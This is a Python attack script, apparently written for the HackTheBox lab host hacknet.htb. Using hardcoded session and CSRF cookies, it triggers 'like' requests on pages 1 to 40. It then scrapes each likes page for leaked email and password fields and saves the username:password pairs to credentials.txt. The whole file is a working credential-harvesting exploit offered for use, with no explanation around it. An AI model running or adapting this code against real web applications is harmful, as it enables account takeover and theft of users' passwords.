#!/usr/bin/env python3
# Sends a "like" for each numeric page, then fetches the page and extracts user:password pairs.

import time, html, re
import requests

# ---------- CONFIG: set your values here ----------
likes_base   = "http://hacknet.htb/likes/"   # page fetch base (e.g. http://host/likes/)
like_base    = "http://hacknet.htb/like/"    # like endpoint base (e.g. http://host/like/)
# Put your real tokens here:
COOKIES = {
    "csrftoken": "Gd3WPbfKtmnmPzYFFfPilAp7zHaFgZPl",   # <-- YOUR csrftoken cookie
    "sessionid": "8rziia6ax6dhcvjin6vauid67y8bztjv"   # <-- YOUR sessionid cookie
}
START = 1      # start index
END   = 40     # end index (inclusive)
DELAY = 0.2    # optional short delay between requests (seconds)
# -------------------------------------------------

USER_RE = re.compile(r'<img[^>]+title=["\']([^"\']+)["\']', re.I)
DICT_OBJ_RE = re.compile(r"\{.*?\}", re.S)
FIELD_RE = lambda name: re.compile(rf"""['"]{name}['"]\s*:\s*['"]([^'"]+)['"]""")

def extract_from_text(t):
    """Extract usernames (from emails) and passwords from the HTML content."""
    t = html.unescape(t or "")
    found = {}

    # # Extract email addresses and use the part before '@' as the username
    # for u in USER_RE.findall(t):
    #     email_match = re.search(r'email\s*[:=]\s*["\']([^"\']+)["\']', u)
    #     if email_match:
    #         email = email_match.group(1)
    #         username_from_email = email.split('@')[0]  # Take part before '@'
    #         if username_from_email.strip() not in found:
    #             found[username_from_email.strip()] = None

    # Extract username:password pairs from the JSON-like objects
    for obj in DICT_OBJ_RE.findall(t):
        e_m = FIELD_RE("email").search(obj)
        p_m = FIELD_RE("password").search(obj)
        if e_m and p_m:
            username_from_email = e_m.group(1).split('@')[0]  # Take part before '@'
            found[username_from_email] = p_m.group(1)

    return found

def check_if_like_exists(page_url, sess):
    """Checks if the page already contains 'username' before sending a like."""
    print(f"Checking if like already exists on {page_url}...")
    try:
        r = sess.get(page_url, timeout=6)
        if r.status_code == 200:
            if "username" in r.text:  # If 'username' is found on the page, like already exists
                print("Like already exists.")
                return True
            else:
                print("Like not found.")
        else:
            print(f"Error: received status code {r.status_code} while checking {page_url}")
    except Exception as e:
        print(f"Error checking page {page_url}: {e}")
    return False

def main():
    sess = requests.Session()
    # Apply cookies into session
    sess.cookies.update(COOKIES)

    aggregate = {}

    for i in range(START, END + 1):
        like_url = f"{like_base}{i}"
        page_url = f"{likes_base}{i}"

        # 1) Check if the like already exists (i.e., 'username' is on the /likes/{i} page)
        if check_if_like_exists(page_url, sess):
            print(f"Skipping like operation for {page_url} as it's already liked.")
        else:
            # 2) send like (GET)
            try:
                print(f"[{i}] GET {like_url} ...", end=" ")
                r = sess.get(like_url, timeout=6)
                if r.status_code in (200, 201, 204, 302):
                    print(f"ok ({r.status_code})")
                else:
                    print(f"resp {r.status_code}")
            except Exception as e:
                print(f"error: {e}")

            time.sleep(DELAY)

            # 3) Check if like was successful by looking for "username" in the /likes/{i} page
            if not check_if_like_exists(page_url, sess):
                print(f"Skipping {page_url} as like did not succeed.")
                continue

        # 4) Fetch the page and parse it for user:password pairs
        try:
            print(f"[{i}] GET {page_url} ...", end=" ")
            r = sess.get(page_url, timeout=6)
            if r.status_code != 200:
                print(f"skip (HTTP {r.status_code})")
                continue
            print("ok")
            found = extract_from_text(r.text)
            for u, p in found.items():
                if u not in aggregate or aggregate[u] is None:
                    aggregate[u] = p
        except Exception as e:
            print(f"error fetching {page_url}: {e}")

        # polite delay
        time.sleep(DELAY)

    # write results (only entries that include a password)
    lines = []
    for u, p in sorted(aggregate.items()):
        if p:
            lines.append(f"{u}:{p}")

    with open("credentials.txt", "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines))

    print(f"Done. Wrote {len(lines)} username:password entries to credentials.txt")

if __name__ == "__main__":
    main()
